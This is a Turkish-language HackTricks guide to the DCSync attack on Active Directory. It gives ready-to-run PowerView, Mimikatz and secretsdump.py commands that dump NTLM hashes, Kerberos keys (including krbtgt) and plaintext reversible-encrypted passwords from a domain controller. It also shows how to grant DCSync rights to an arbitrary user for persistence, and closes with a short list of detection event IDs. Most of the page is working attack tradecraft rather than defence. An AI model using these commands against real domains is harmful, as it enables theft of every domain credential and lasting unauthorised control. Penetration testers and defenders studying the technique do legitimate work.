# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** izni, alan üzerinde bu izinlere sahip olmayı gerektirir: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.

**DCSync ile ilgili Önemli Notlar:**

- **DCSync saldırısı, bir Alan Denetleyicisinin davranışını simüle eder ve diğer Alan Denetleyicilerinden bilgileri çoğaltmalarını ister** Directory Replication Service Remote Protocol (MS-DRSR) kullanarak. MS-DRSR, Active Directory'nin geçerli ve gerekli bir işlevi olduğundan, kapatılamaz veya devre dışı bırakılamaz.
- Varsayılan olarak yalnızca **Domain Admins, Enterprise Admins, Administrators ve Domain Controllers** grupları gerekli ayrıcalıklara sahiptir.
- Herhangi bir hesap parolası tersine çevrilebilir şifreleme ile saklanıyorsa, Mimikatz'ta parolayı düz metin olarak döndürmek için bir seçenek mevcuttur.

### Enumeration

Bu izinlere kimin sahip olduğunu kontrol etmek için `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Yerel Olarak Sömürme
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Uzaktan Sömürme
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 3 dosya oluşturur:

- biri **NTLM hash'leri** ile
- biri **Kerberos anahtarları** ile
- biri de [**tersine şifreleme**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkin olan herhangi bir hesap için NTDS'den düz metin şifreleri ile. Tersine şifreleme ile kullanıcıları şu şekilde alabilirsiniz:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Süreklilik

Eğer bir alan yöneticisiyseniz, bu izinleri `powerview` yardımıyla herhangi bir kullanıcıya verebilirsiniz:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Sonra, kullanıcının 3 ayrıcalığın doğru bir şekilde atanıp atanmadığını **kontrol edebilirsiniz** (ayrıcalıkların adlarını "ObjectType" alanında görebilmelisiniz):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Nesne için Denetim Politikası etkin olmalıdır) – Bir nesne üzerinde bir işlem gerçekleştirildi
- Security Event ID 5136 (Nesne için Denetim Politikası etkin olmalıdır) – Bir dizin hizmeti nesnesi değiştirildi
- Security Event ID 4670 (Nesne için Denetim Politikası etkin olmalıdır) – Bir nesne üzerindeki izinler değiştirildi
- AD ACL Scanner - ACL'lerin raporlarını oluşturun ve karşılaştırın. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
